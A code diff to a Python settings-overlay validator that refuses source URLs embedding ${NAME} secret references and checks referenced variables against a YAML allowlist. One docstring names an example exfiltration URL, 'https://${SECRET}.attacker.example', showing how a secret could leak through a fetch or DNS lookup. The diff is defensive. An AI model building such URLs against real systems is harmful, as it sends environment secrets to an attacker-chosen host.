@@ -9,9 +9,14 @@ Storage and the overlay-specific shape rules live here; the merge and the config
 validator own everything else. A secret-bearing notifier key may only be a ``${NAME}`` or
 ``${NAME_FILE}`` reference, ``headers`` cannot be written at all, and a source's
 ``secret_keys`` are references: a credential the validator knows how to name never reaches
-this file. One limit worth knowing: a source ``url`` is ordinary configuration, so a URL
-that carries a token has to be written as a reference and nothing here can tell whether it
-was.
+this file.
+
+A reference in the overlay reads any variable of the process, and the overlay is written from
+a browser session, so the YAML decides which variables it may name: ``overlay_references``
+(see ``config.unlisted_overlay_references``), empty by default. That check needs the YAML, so
+it runs where the two meet, when the overlay is merged; a source ``url`` is the one value that
+is also shaped here, because a reference spliced into a URL is sent to a host the session chose:
+the overlay may store only one whole reference there, and any other ``$`` is refused.
 """
 
 from __future__ import annotations
@@ -23,7 +28,7 @@ import threading
 from pathlib import Path
 
 from .catalogue import SOURCE_SPECS
-from .config import NOTIFIER_SECRET_KEYS, ConfigError
+from .config import NOTIFIER_SECRET_KEYS, ConfigError, unlisted_overlay_references
 from .state import describe_schema, save_json, serialize_json, state_lock
 
 #: The schema tag the stored document declares.
@@ -64,15 +69,51 @@ def is_reference(value: object) -> bool:
     return isinstance(value, str) and SECRET_REFERENCE.fullmatch(value) is not None
 
 
+def _url_reference_error(url: object) -> str | None:
+    """Why an overlay-added source url may not carry a ``$``; ``None`` when it may.
+
+    A url is sent wherever it points, so a reference inside one (``https://host/c?k=${NAME}``) is a variable
+    the browser session chose to send to a host it chose, whether or not the variable is allowed: allowing
+    ``FEED_TOKEN`` for a ``token`` field is not allowing it in someone else's query string. The overlay may
+    store one whole reference as the url, which ``overlay_references`` then judges; a url that embeds one is
+    written in the YAML. A literal ``$`` is refused with it, because nothing can tell it from a reference
+    that failed to match and a feed address can write it as ``%24``.
+    """
+    if isinstance(url, str) and "$" in url and not is_reference(url):
+        return (
+            "a url may contain '$' only as one whole ${NAME} reference that overlay_references lists; "
+            "write any other '$' as %24, or add the source in the YAML"
+        )
+    return None
+
+
+def added_source_reference_error(entry: dict, allowed: frozenset[str]) -> str | None:
+    """Why a source entry the overlay would add may not use the references it carries; ``None`` when it may.
+
+    For the callers that act on an entry *before* it is saved -- a probe fetches it, a duplicate check resolves
+    its host -- and so must refuse before the reference is expanded: a saved overlay is judged when it is merged,
+    but a fetch or a DNS lookup of ``https://${SECRET}.attacker.example`` has already left by then. Names only,
+    never a value.
+    """
+    message = _url_reference_error(entry.get("url"))
+    if message is not None:
+        return message
+    unlisted = unlisted_overlay_references({"sources_added": [entry]}, {}, allowed)
+    if unlisted:
+        return "it references variables the YAML does not list under overlay_references: " + ", ".join(unlisted)
+    return None
+
+
 def validate_settings(settings: object) -> dict:
     """Refuse an overlay the runtime could not apply, without repeating the config validator.
 
     Only rules specific to the overlay live here: the ten-key allowlist, the reference-only secret
     rule, the shape of a YAML source's ``enabled``/``tag``/``thresholds``/``interval`` edit, and the shape of
-    a complete source the overlay adds. Values the YAML validator checks -- a poll interval, a per-source
-    interval, a hidden-host list, a threshold number, a notifier's keys and its ``enabled`` boolean, a
-    source's remaining keys, a route's match keys, whether a selected notifier is enabled, and the delivery
-    policy -- are merged and left to it, so both sources of truth fail with one message.
+    a complete source the overlay adds, whose url may embed no reference. Values the YAML validator checks --
+    a poll interval, a per-source interval, a hidden-host list, a threshold number, a notifier's keys and its
+    ``enabled`` boolean, a source's remaining keys, a route's match keys, whether a selected notifier is
+    enabled, and the delivery policy -- are merged and left to it, so both sources of truth fail with one
+    message.
     """
     if not isinstance(settings, dict):
         raise ConfigError("settings: the overlay must be a mapping")
@@ -135,8 +176,9 @@ def validate_settings(settings: object) -> dict:
 def _validate_added_sources(added: object) -> None:
     """A complete source the overlay adds: a mapping with a literal id, a built-in type and its required keys.
 
-    Credentials this module can recognise -- a kind's ``secret_keys`` -- must be references; a ``url`` is not
-    one of them, so a URL that embeds a token is stored as written.
+    Credentials this module can recognise -- a kind's ``secret_keys`` -- must be references. A ``url`` is not
+    one of them, but it is where those credentials are sent, so it may not embed a reference: see
+    :func:`_url_reference_error`. Which variables a reference may name is judged by the merge, which has the YAML.
 
     A non-mapping is refused rather than skipped: ``config._merge_added_sources`` skips one it cannot read, so
     the entry would vanish between the two owners and the operator would see a saved source that never ran.
@@ -180,6 +222,9 @@ def _validate_added_sources(added: object) -> None:
                     f"settings: added source {identifier!r}: {key} must be a ${{NAME}} or ${{NAME_FILE}} "
                     "reference; a literal secret is never stored"
                 )
+        url_error = _url_reference_error(entry.get("url"))
+        if url_error is not None:
+            raise ConfigError(f"settings: added source {identifier!r}: {url_error}")
         # A per-source threshold block is ordinary numbers, but its shape is checked here too: the entry is
         # stored whole, so a stored block the merge cannot read would be written and only refused on reload.
         if "thresholds" in entry and not isinstance(entry["thresholds"], dict):
